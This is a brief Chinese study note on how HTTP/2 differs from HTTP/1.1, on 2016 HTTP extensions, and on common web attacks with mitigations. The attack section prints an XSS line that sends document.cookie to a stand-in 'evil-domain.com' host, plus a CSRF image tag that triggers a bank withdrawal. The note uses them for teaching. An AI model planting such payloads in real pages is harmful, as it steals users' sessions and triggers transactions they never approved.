#### 1.HTTP2和HTTP1.1有几处基本不同

1. HTTP2是二进制协议而不是文本协议。不再可读，也不可无障碍的手动创建，改善的优化技术现在可被实施。
2. 这是一个可复用协议。并行的请求能在同一个链接中处理，移除了HTTP1.x中顺序和阻塞的约束；
3. 压缩了headers,因为headers在一系列请求中常常是相似的，其移除了重复和传输重复数据的成本；
4. 其允许服务器在客户端缓存中填充数据，通过一个叫服务器推送的机制来提前请求。

#### 2.HTTP2进化

2016年HTTP的新扩展：

1. 对Alt-Svc的支持允许了给定资源的位置和资源鉴定，允许了更智能的CDN缓存机制；
2. Client-Hints的引入允许浏览器或者客户端来主动交流它的需求，或是硬件约束的信息给服务端；
3. 在Cookie头中引入安全相关的前缀，现在帮助保证一个安全的cookie没被更改过。

#### 3.常见的攻击

1. 会话劫持和XSS

   ```js
   (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
   ```

   `HttpOnly`类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。

2. 跨站请求伪造（CSRF）

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

- 对用户输入进行过滤来阻止[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)；

- 任何敏感操作都需要确认；

- 用于敏感信息的Cookie只能拥有较短的生命周期；

  